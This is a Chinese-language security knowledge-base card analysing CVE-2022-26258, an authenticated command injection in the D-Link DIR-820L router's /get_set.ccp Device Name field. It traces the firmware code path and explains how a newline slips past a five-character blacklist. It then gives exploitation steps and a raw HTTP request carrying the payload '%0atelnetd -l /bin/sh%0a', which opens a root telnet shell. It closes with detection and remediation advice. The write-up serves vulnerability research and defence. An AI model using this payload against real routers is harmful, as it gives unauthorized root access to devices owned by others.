---
id: iot-dlink-dir820l-get-set-device-name-command-injection
title: D-Link DIR-820L /get_set.ccp DeviceName 换行绕过 ncc2 黑名单命令注入（CVE-2022-26258）
type: scenario
domain: iot
path: iot
technique: dlink-dir820l-lanasp-device-name-get-set-ccp-ncc2-flash-set-device-name-system-command-injection
tags:
- iot
- dlink
- router
- firmware
- command-injection
- cve-2022-26258
- ncc2
- mips
- authenticated
- telnet
cve:
- CVE-2022-26258
affected_versions: D-Link DIR-820L 1.05B03（DIR820LA1_FW105B03，原文复现固件）
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V285
  verified_at: '2026-11-08T05:27:57+08:00'
  notes: 已对照原文与29张图逐项核对：图01 CVE-2022-26258 描述；图02-03 lan.asp lan_device_name→lanHostCfg_DeviceName_1.1.1.0→get_set.ccp；图04-05 grep get_set 定位 ncc2/get_set.id0/smbd/flash；图06 rcS 自启 bulkListen+ncc2；图09-12 system/_system xref、device_name 字符串与 flash set DEVICE_NAME %s、sub_4F6DFC；图13 不可控 a2 分支；图16-17 hasInjectionString 只过滤反引号/反斜杠/分号/双引号/竖线；图20-23 get_set.ccp 原始请求 device name=%0atelnetd -l /bin/sh%0a→telnet root shell。均与卡片一致。dup-scan 与同文 ping_addr 卡判 likely_duplicate，裁决为并列保留：两者是不同 CVE、不同入口(/lan.asp→/get_set.ccp vs /tools_vct.asp→/ping.ccp)、不同参数与不同 ncc2 sink 命令模板(flash set DEVICE_NAME vs doPingV6)，仅共用 hasInjectionString 五字符黑名单与 %0a 绕过；任删一张会丢失一个 CVE 的可复现链。versions 按原文固件 DIR820LA1_FW105B03 保留。未本地复跑 PoC。
url: /docs/iot/iot-dlink-dir820l-get-set-device-name-command-injection/
draft: false
kb_aliases:
- CVE-2022-26258
- DIR-820L
- DIR-820LA1_FW105B03
- lan.asp Device Name
- get_set.ccp
- lanHostCfg_DeviceName_1.1.1.0
- ncc2 命令注入
- flash set DEVICE_NAME
- hasInjectionString
- D-Link 路由器命令执行
---

## 一句话结论

D-Link DIR-820L 1.05B03 登录后，`lan.asp` 将 Device Name 作为 `lanHostCfg_DeviceName_1.1.1.0` 提交到 `/get_set.ccp`；`ncc2` 的 get_set 回调把该值格式化为 `flash set DEVICE_NAME %s` 后经 `_system()` 交给 shell，过滤函数 `hasInjectionString` 只拦反引号、反斜杠、分号、双引号、竖线而漏掉换行，因此 `%0atelnetd -l /bin/sh%0a` 可注入并开启 root telnet shell（CVE-2022-26258）。

## 原理

- **前端取值与提交**：`lan.asp` 的 `send_request()` 从 `lan_device_name` 读取 Device Name；在 `dev_mode == "0"` 分支把 `&lanHostCfg_DeviceName_1.1.1.0=` 与值拼进 `paramStr`，`copyDataToDataModelFormat()` 返回该串，随后 `submitParam.arg = submitStr`、`submitParam.url = "get_set.ccp"`，由 `get_config_obj`/`ajax_submit` 发出 POST。前端还调用 `check_dev_name()`，但只是 JS 侧校验，直接改原始请求即可绕过。
- **后端不是独立 CGI**：镜像中不存在 `get_set.ccp` 文件；真正处理它的是开机脚本 rcS 中自启的 `ncc2`（`if [ ! -e /flash/no_ncc ]; then bulkListen & ncc2 & fi`）。`ncc2` 内含 `get_set` 字符串和 `callback_ccp_get_set` 回调注册项（IDO 表 `.word aGetSet` / `.word callback_ccp_get_set`）。
- **回调到 sink**：回调链最终进入 `sub_4F6DFC`，用 `getObj(0x60u)` 取出对象 `Obj`，先调用 `hasInjectionString(*Obj)` 检查，通过后执行 `_system("ncc_rtk_l1tdd.c", 63, "mySpStart", "flash set DEVICE_NAME %s", *Obj)`；`_system` 是带文件名/行号/函数名日志的 `system()` 包装，命令最终由 `/bin/sh -c` 解析执行。
- **为什么能注入**：`%s` 填入的是未转义的 Device Name。`hasInjectionString` 只做五次 `strpos`：反引号、反斜杠、分号、双引号、竖线，任一命中才拒绝；换行（0x0a）、冒号、`$()`、`&`、空格等都不在黑名单。换行在 shell 中起命令分隔作用，于是 `flash set DEVICE_NAME <值>` 之后另起一行执行 `telnetd -l /bin/sh`。
- **不可控分支**：同一函数末尾还有 `_system("ncc_rtk_l1tdd.c", 68, "mySpStart", "%s %s", "l1d2d", a2)`；文章追踪后确认 `a2` 不完全可控，该路不通，真正可利用的是从 `getObj(0x60)` 取出的 Device Name 路径。

## 触发条件

- 目标为 D-Link DIR-820L，固件 1.05B03（原文复现固件包 `DIR820LA1_FW105B03.bin`），Web 管理面可达。
- 需要有效管理员会话；原文环境默认 Admin、密码为空，请求携带 Cookie `hasLogin=1`，属登录后命令执行。
- `lanHostCfg_DeviceName_1.1.1.0` 的值中不能出现反引号、反斜杠、分号、双引号、竖线；用 URL 编码换行 `%0a` 分隔命令。
- 原文强调必须在代理中直接修改 `lan.asp` 发出的原始保存请求再转发，不要放进 Repeater 重放：重复提交会令设备崩溃或无法执行；发送后等待约 10 秒。
- 设备包含 BusyBox telnetd，且 23 端口未被防火墙/访问控制拦截。

## 利用步骤

1. 访问 `http://192.168.0.1/login.asp`，按原文用默认 Admin / 空密码登录。
2. 打开 `lan.asp` 网络设置页，把 Device Name 改为 `%0atelnetd -l /bin/sh%0a`；或在代理中把原始 `POST /get_set.ccp` 的 `lanHostCfg_DeviceName_1.1.1.0` 值替换为该串。
3. 点击保存，在 Burp 中拦截到原始请求后直接修改并 Forward，等待约 10 秒（不要重放多次）。
4. 执行 `telnet 192.168.0.1`，连接后直接得到 `#` root shell。
5. 若浏览器表单对 `%` 做了二次编码，需在原始包中确认 payload 仍为 `%0atelnetd -l /bin/sh%0a` 的 URL 编码形式。

## PoC

原文在 FIRMAE 模拟环境验证。最小 PoC 为拦截到的原始请求，关键字段如下（其余字段按 `lan.asp` 正常提交内容保留）：

```http
POST /get_set.ccp HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: hasLogin=1

ccp_act=set&old_ip=192.168.0.1&old_mask=255.255.255.0&new_ip=192.168.0.1&new_mask=255.255.255.0&nextPage=lan.asp&lanHostCfg_IPAddress_1.1.1.0=192.168.0.1&lanHostCfg_SubnetMask_1.1.1.0=255.255.255.0&lanHostCfg_DeviceName_1.1.1.0=%0atelnetd -l /bin/sh%0a&lanHostCfg_DomainName_1.1.1.0=&lanHostCfg_DNSRelay_1.1.1.0=1&lanHostCfg_DHCPServerEnable_1.1.1.0=1&lanHostCfg_MinAddress_1.1.1.0=192.168.0.100&lanHostCfg_MaxAddress_1.1.1.0=192.168.0.200&lanHostCfg_DHCPLeaseTime_1.1.1.0=1440
```

```bash
sleep 10
telnet 192.168.0.1
# 连接后直接是 # root shell
```

原文未提供独立 Python/脚本 PoC；上述请求与等待、telnet 连接即其复现流程。仅限授权环境使用。

## 变体与关联

- 绕过变体：黑名单漏掉换行，`%0a` 即可；文章同时指出冒号、换行未被过滤，实际还可尝试 `$(cmd)`、`&cmd`、`>` 重定向等未被枚举的元字符（是否在目标 shell 中生效需按具体命令验证）。
- 同一固件第二条链：`/ping.ccp` 的 `ping_addr` 使用同一套黑名单并以 `%0a` 注入（CVE-2022-34974），见 [[iot-dlink-dir820l-ping-ccp-ping-addr-command-injection]]。
- 分析套路复用：GUI 表单字段名 → `*.ccp` 请求 → 固件中 grep 处理 URL 的字符串并与 rcS 自启服务对照 → 对 `system`/`_system` 交叉引用定位函数 → 找 `hasInjectionString` 类过滤函数确认缺口；可在其他 D-Link ncc2 机型上复用。
- 关联同类 D-Link 路由器命令注入：[[iot-dlink-dir615-645-815-service-cgi-event-command-injection]]、[[iot-dlink-di8100-upgrade-filter-asp-path-command-injection]]、[[iot-firmware-boa-pin-command-injection]]。

## 检测与防御

- 检测：`POST /get_set.ccp` 的 `lanHostCfg_DeviceName_1.1.1.0` 含 `%0a`/换行、`$(`、`&` 等异常字符；`ncc2` 派生 `telnetd`/`sh` 子进程；设备 23 端口出现非预期监听；Device Name 被写入 NVRAM（`flash set DEVICE_NAME`）。
- 修复：升级厂商修复固件；管理面仅限内网/可信网段并禁止空口令。
- 代码/固件层：不要用 `system()` 拼接配置值，改用固定 argv 的 `execve`；Device Name 做服务端白名单（字母数字、连字符）并拒绝控制字符与 shell 元字符；过滤函数必须覆盖换行、回车、`$`、`&`、括号等，但根治是消除 shell 解释层。
